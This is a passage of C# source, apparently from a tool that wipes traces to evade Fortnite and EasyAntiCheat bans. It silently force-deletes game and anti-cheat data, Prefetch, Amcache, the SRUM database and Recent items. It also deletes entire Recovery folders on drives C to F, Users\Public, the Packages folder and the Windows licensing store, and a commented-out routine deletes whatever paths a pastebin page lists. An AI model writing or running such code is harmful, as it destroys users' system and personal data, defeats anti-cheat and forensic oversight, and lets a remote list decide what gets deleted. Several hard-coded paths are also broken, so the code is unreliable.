                    File.Delete("E:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {


                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("E:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("E:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("E:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("E:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\MSOCache"))
                {
                    Directory.Delete("E:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }
            try
            {

                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF245551b.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF24465f8.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

                }
            }
            catch
            {

            }

            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009023", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009022", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009024", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009025", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009026", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009027", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009028", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009029", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\temp\\w1053", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\Prefetch", true);

                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("F:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("F:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("F:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("F:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {


                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("F:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("F:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("F:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\MSOCache"))
                {
                    Directory.Delete("F:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }
            try
            {

                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF245551b.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF24465f8.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

                }
            }
            catch
            {

            }

            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009023", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009022", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009024", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009025", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009026", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009027", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009028", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009029", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\temp\\w1053", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\Prefetch", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
        }




        public static void CleanFile(string asrg)
        {
            if (asrg != null)
            {
                bool existed = false;
                if (File.Exists(asrg))
                {
                    existed = true;
                }
                try
                {

                    File.Delete(asrg);
                }
                catch
                {
                    try
                    {

                        File.Delete(asrg);

                    }
                    catch
                    {
                        try
                        {

                            File.Delete(asrg);

                        }
                        catch
                        {
                            try
                            {

                                File.Delete(asrg);

                            }
                            catch
                            {
                            }
                        }
                    }
                }

                if (!File.Exists(asrg) && existed == true)
                {
                    if (File.Exists(@"C:\Users\" + Environment.UserName + @"\Desktop\debug.sys"))
                        Console.WriteLine("Deleted " + asrg);
                }
            }
        }

        private static int Count = 0;

        /* public static void OnlineClean()
         {

             new Thread(new ThreadStart(Cleaners.Worker)).Start();
             Cleaners.CleanDir("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp");
             Cleaners.CleanDir("C:\\Windows\\Temp");
             try
             {
                 Directory.CreateDirectory("C:\\Windows\\Temp");
             }
             catch (System.UnauthorizedAccessException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IO.FileNotFoundException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IO.DirectoryNotFoundException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.Reflection.TargetInvocationException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IO.IOException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.NotSupportedException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IndexOutOfRangeException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.ArgumentException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             try
             {
                 foreach (string directory1 in Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Packages"))
                 {
                     foreach (string directory2 in Directory.GetDirectories(directory1))
                     {
                         if (directory2.Contains("AC") || directory2.ToLower().Contains("temp"))
                             Cleaners.CleanDir(directory2);
                     }
                 }
             }
             catch (System.UnauthorizedAccessException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IO.FileNotFoundException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IO.DirectoryNotFoundException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.Reflection.TargetInvocationException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IO.IOException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.NotSupportedException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.IndexOutOfRangeException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch (System.ArgumentException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
             catch
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }

             WebClient webClient = new WebClient();

             string motd = webClient.DownloadString("https://pastebin.com/raw/cvXq6h6t").Replace("/", "\\").Replace("..user..", Environment.UserName).Replace(" ", "");
             string[] separator = new string[1] { "\n" };
             int count = motd.Length - 0;
             foreach (var asrg in motd.Split(separator, count, StringSplitOptions.None))
             {
                 try
                 {
                     Directory.Delete(asrg, true);
                     Console.ForegroundColor = ConsoleColor.Green;
